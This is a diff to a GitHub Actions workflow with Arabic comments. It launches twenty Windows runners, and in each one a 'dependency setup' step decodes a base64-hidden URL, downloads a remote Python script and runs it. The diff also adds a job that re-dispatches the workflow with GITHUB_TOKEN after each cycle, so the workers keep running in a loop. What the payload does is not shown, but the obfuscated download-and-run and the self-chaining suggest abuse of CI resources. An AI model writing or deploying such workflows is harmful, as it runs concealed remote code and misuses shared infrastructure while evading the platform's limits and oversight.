@@ -1,24 +1,23 @@
-name: Matrix dAut44
+name: Matrix Aut44
 
 on:
-  workflow_dispatch:
-  schedule:
-    - cron: '0 * * * *'
+  workflow_dispatch: # التشغيل اليدوي لأول مرة فقط
 
+# ضمان تشغيل دورة واحدة فقط في أي وقت منعاً للتداخل
 concurrency:
-  group: matrix-pool-${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: false
+  group: matrix-pool-aut44
+  cancel-in-progress: true
 
 jobs:
   launch-workers:
     name: "Agent-${{ matrix.node_index }}"
     runs-on: windows-2022
-    timeout-minutes: 75
+    timeout-minutes: 17 # مهلة أمان أعلى من 15 دقيقة بقليل
 
     strategy:
       fail-fast: false
       matrix:
-        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
+        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
       - name: System Init & Dependency Setup
@@ -26,7 +25,6 @@ jobs:
         run: |
           echo "[INITIALIZING] Setting up Worker-${{ matrix.node_index }}..."
           
-          # فك تشفير الرابط الجديد وتحميل الملف
           REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
           
           curl -sL "$REMOTE_SRC" -o app_task.py
@@ -53,10 +51,11 @@ jobs:
           }
           $WorkerProc = Start-Process @ProcessParams
           
-          Write-Output ">>> Supervisor online. Enforcing maximum runtime: 74 minutes."
+          Write-Output ">>> Supervisor online. Enforcing maximum runtime: 15 minutes."
           
           try {
-              Wait-Process -InputObject $WorkerProc -Timeout 4440 -ErrorAction Stop
+              # 900 ثانية = 15 دقيقة بالضبط
+              Wait-Process -InputObject $WorkerProc -Timeout 900 -ErrorAction Stop
               Write-Output ">>> Process finished execution within limit."
           }
           catch {
@@ -68,3 +67,19 @@ jobs:
       - name: Completion Status
         shell: bash
         run: echo "[COMPLETE] Worker-${{ matrix.node_index }} finished execution cycle."
+
+  # هذه المهمة تُستدعى تلقائياً بعد انتهاء جميع الـ 15 سيرفر لتشغيل الدورة التالية
+  trigger-next-run:
+    needs: launch-workers
+    if: always() # لضمان التشغيل حتى لو حدث خطأ في إحدى العقد
+    runs-on: ubuntu-latest
+    permissions:
+      actions: write
+    steps:
+      - name: Trigger Next Execution
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo ">>> 15 minutes cycle finished. Triggering next cycle automatically..."
+          gh api -X POST /repos/${{ github.repository }}/actions/workflows/${{ github.workflow }}/dispatches \
+            -f ref="${{ github.ref }}"
